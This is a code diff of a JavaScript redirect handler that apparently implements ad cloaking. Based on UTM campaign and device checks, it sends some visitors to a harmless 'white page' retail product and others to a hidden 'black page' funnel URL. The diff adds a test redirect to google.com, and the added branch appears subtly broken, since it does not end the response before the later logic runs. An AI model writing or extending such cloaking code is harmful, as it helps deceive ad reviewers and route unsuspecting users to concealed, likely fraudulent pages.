@@ -4,6 +4,7 @@ export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://corkcicle.com/collections/coffee-mug/products/star-wars-coffee-mug?variant=40141759152216";
     const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
+    const testUrl = "https://google.com";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -12,7 +13,11 @@ export default function handler(req, res) {
     // Get the User-Agent from the request headers
     const userAgent = req.headers['user-agent'] || '';
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  
+
+    if (!isRedirectEnabled) {
+        res.writeHead(302, { Location: testUrl });
+    }
+    
     // Redirection logic
     if (utmCampaign === '__AID_NAME__') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
